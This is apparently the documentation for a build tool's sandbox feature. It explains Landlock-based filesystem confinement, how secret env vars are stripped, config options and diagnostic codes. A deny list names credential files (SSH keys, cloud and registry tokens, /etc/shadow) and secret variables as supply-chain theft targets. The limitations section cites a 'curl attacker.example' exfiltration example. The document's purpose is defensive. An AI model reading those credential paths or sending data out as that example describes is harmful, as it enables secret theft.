# The sandbox

The sandbox confines every magus subprocess and in-process spell to the
workspace plus a curated allowlist of cache and system paths, and replaces
the child-process environment with a minimum allowlist so secret-bearing
variables do not leak to a compromised third-party spell.

It is designed to neutralize the class of supply-chain attacks that have
appeared on npm and the VS Code marketplace, where a compromised package
or extension reads credentials from disk and exfiltrates them.

## What sandbox blocks

- Reads of files outside `<workspace>` + `/tmp` + system libs.
  This denies `~/.aws/credentials`, `~/.vault-token`, `~/.ssh/id_rsa`,
  `~/.npmrc`, `~/.config/op`, `~/.docker/config.json`, `~/.kube/config`,
  `/etc/shadow`, and the rest of the usual supply-chain targets.
- Writes outside `<workspace>` + `/tmp`. System library paths are
  read-only.
- Inheritance of secret-bearing env vars in child processes:
  `AWS_*`, `GITHUB_TOKEN`, `VAULT_*`, `OP_SESSION_*`, `NPM_TOKEN`,
  `ANTHROPIC_API_KEY`, etc. By default only `HOME`, `PATH`, `USER`,
  locale vars, terminal vars, and the `MAGUS_*` daemon coordination
  vars pass through.

## What sandbox does NOT block (v1)

- **Network egress.** A compromised spell with no token in its env can
  still `curl attacker.example`. Future versions will add an opt-in
  `sandbox_network` flag.
- **In-memory secret theft from magus itself.** If magus is holding a
  secret in memory at the moment a spell runs, landlock cannot help.

## Enabling it

In `magus.yaml`:

```yaml
sandbox:
  enabled: true
```

Or per-invocation:

```sh
MAGUS_SANDBOX_ENABLED=1 magus run build
```

## Extending the allowlist

```yaml
sandbox:
  enabled: true
  allow:
    - path: ~/.cargo
      mode: rw
    - path: ~/.terraform.d/plugins
      mode: ro
  env:
    passthrough:
      - GOPATH
      - GOCACHE
      - GOMODCACHE
      - CARGO_HOME
      - "MISE_*"
```

`mode` is `ro` (read-only) or `rw` (read+write). Glob support in
`sandbox.env.passthrough` is suffix-only: `NAME_*` matches everything
that starts with `NAME_`.

## Enforcement mechanism

Two layers run together:

1. **Kernel level.** On Linux ≥5.13, magus calls `landlock_restrict_self`
   on itself before any spell code runs. The restriction is inherited
   across `fork+exec`, so every child process gets the same filesystem
   confinement automatically. No root required.
2. **Interpreter level.** The Buzz `fs.*`, `sh.*`, `env.*`
   bindings consult the policy before performing any path or process
   operation. This gives spells a friendly `MGS2001/MGS2002` error
   message and is the only enforcement on macOS, Windows, or older Linux
   kernels (see `MGS2005.md`).

## Diagnostic codes

| Code      | Meaning                                              |
| --------- | ---------------------------------------------------- |
| `MGS2001` | path read denied                                     |
| `MGS2002` | path write denied                                    |
| `MGS2003` | env vars stripped from child                         |
| `MGS2004` | sandbox.allow entry failed to resolve                |
| `MGS2005` | landlock unavailable; interpreter-level only         |
| `MGS2006` | likely PATH-shim manager (mise/asdf/direnv) stripped |
| `MGS2007` | exec denied                                          |
